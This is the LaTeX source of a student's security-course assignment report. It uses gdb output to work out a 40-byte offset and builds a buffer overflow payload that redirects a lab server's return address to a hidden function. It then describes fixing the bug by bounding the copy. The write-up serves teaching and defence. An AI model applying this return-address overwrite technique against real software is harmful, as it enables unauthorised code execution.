\documentclass[11pt]{article}


%%% Packages
%%
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{fancyhdr}
\usepackage{float}
\usepackage{graphicx}
\usepackage{listings}
\usepackage{enumitem}
\usepackage{verbatim}
\usepackage[margin = 1in, headheight = 13.6pt]{geometry}
\usepackage[linktoc=all]{hyperref}
%%
%%%


%%% Formatting
%%
\parindent 0em
\parskip 1em
\pagestyle{fancy}
\fancyhead{}
\fancyfoot{}
\fancyhead[L]{\slshape\MakeUppercase{{\myTitle}}}
\fancyhead[R]{\slshape{\myName}}
\fancyfoot[C]{\thepage}
%%
%%%


%%% User defined variables
%%
\def \myTitle {ECE 404 Assignment 10}
\def \myName {Elias Talcott}
\def \myDate {April 9, 2020}
%%
%%%


\begin{document}

\begin{titlepage}
\title{\myTitle}
\author{\myName}
\date{\myDate}
\maketitle
\vspace{1in}
\tableofcontents
\thispagestyle{empty}
\end{titlepage}


\section{Buffer Overflow Attack}

In order to craft a string to execute a buffer overflow attack on the server, I used gdb. I set a breakpoint at the top of the clientComm function, ran the server, and then executed the following commands.

\begin{itemize}
\item (gdb) print \&str
\item \$1 = (char (*)[5]) 0x7fffffffde70
\item (gdb) print /x *((unsigned *) \$rbp + 2)
\item \$2 = 0x400cd9
\item (gdb) x/96b \$rsp
\item 
0x7fffffffde50:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00\\
0x7fffffffde58:	0xb8	0xde	0xff	0xff	0xff	0x7f	0x00	0x00\\
0x7fffffffde60:	0xe0	0xde	0xff	0xff	0xff	0x7f	0x00	0x00\\
0x7fffffffde68:	0x00	0x00	0x00	0x00	0x08	0x00	0x00	0x00\\
0x7fffffffde70:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00\\
0x7fffffffde78:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00\\
0x7fffffffde80:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00\\
0x7fffffffde88:	0x50	0xe1	0xff	0xf7	0xff	0x7f	0x00	0x00\\
0x7fffffffde90:	0xf0	0xde	0xff	0xff	0xff	0x7f	0x00	0x00\\
0x7fffffffde98:	0xd9	0x0c	0x40	0x00	0x00	0x00	0x00	0x00\\
0x7fffffffdea0:	0xd8	0xdf	0xff	0xff	0xff	0x7f	0x00	0x00\\
0x7fffffffdea8:	0x00	0x00	0x00	0x00	0x02	0x00	0x00	0x00
\end{itemize}

Looking at the last output, I found the value 0x400cd9 at the start of the line 0x7fffffffde98. Since the beginning of the buffer is at 0x7fffffffde70, there is a difference of 0x28 to fill between the beginning of the buffer and the start of the return address. This means that 40 characters need to be placed in the buffer before the return address can be altered.

\begin{itemize}
\item (gdb) disas secretFunction
\item
Dump of assembler code for function secretFunction:\\
   0x0000000000400e18 $<+0>$:	push   \%rbp\\
   0x0000000000400e19 $<+1>$:	mov    \%rsp,\%rbp\\
   0x0000000000400e1c $<+4>$:	mov    \$0x400fa8,\%edi\\
   0x0000000000400e21 $<+9>$:	callq  0x4008f0 <puts@plt>\\
   0x0000000000400e26 $<+14>$:	mov    \$0x1,\%edi\\
   0x0000000000400e2b $<+19>$:	callq  0x400a00 <exit@plt>\\
End of assembler dump.
\end{itemize}

This result showed me that the altered return address should be 0x400e18, which would have to be inputted backwards. All of this helped me create a string that would call the secretFunction:

\verb|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x18\x0e\x40\x00|

\pagebreak

\section{Modified Server Code}

In order to fix the buffer overflow vulnerability, I allowed only MAX\_DATA\_SIZE bytes to be copied into str. This means that if the user inputs a long string, only the characters that will fit without overwriting other data will be stored in str. This eliminates the risk of overwriting the return address and launching a buffer overflow attack on this server.

\vspace{1cm}

\lstinputlisting[breaklines = True, language = C]{new_server.c}

\end{document}